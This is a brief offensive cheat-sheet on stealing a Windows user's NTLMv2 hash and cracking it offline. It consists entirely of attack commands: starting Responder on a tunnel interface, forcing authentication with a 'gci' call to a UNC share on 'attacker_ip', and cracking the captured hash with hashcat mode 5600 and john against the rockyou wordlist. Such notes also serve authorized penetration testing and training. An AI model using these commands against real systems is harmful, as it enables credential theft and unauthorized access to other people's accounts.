# Capture the Current user NTLMv2 Hash and Crack it offline

# 1. Start a Responder
```language
responder -I tun0 -dvw
```
# 2. Execution
```language
gci \\attacker_ip\share\touch.txt
```
# 3. save the Hash and crack with John && Hashcat
```language
nano ntlmv2.hash

hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
hashcat -m 5600 -r /usr/share/hashcat/rules/best64.rule ntlmv2.hash /usr/share/wordlists/rockyou.txt


john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2.hash
```
